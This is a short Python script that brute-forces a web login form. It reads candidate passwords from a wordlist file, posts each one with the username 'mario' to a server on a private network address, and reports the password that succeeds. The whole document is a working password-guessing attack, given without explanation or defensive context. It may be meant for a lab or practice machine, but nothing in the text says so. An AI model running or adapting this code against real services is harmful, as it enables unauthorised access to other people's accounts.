import requests


url = 'http://192.168.0.124:5000'
wl = "wordlist.txt"

lst = open(wl, "r")

for line in lst.readlines():
    password = line.strip()
    #print(password)
    http = requests.post(url, 
    data={'username' : 'mario', 'password' : password, 
    'login' : 'submit'})
    content = http.content
    if http.url == url:
        print('Password incorrect : ', password)
    else:
        print('Password correct : ', password)
        break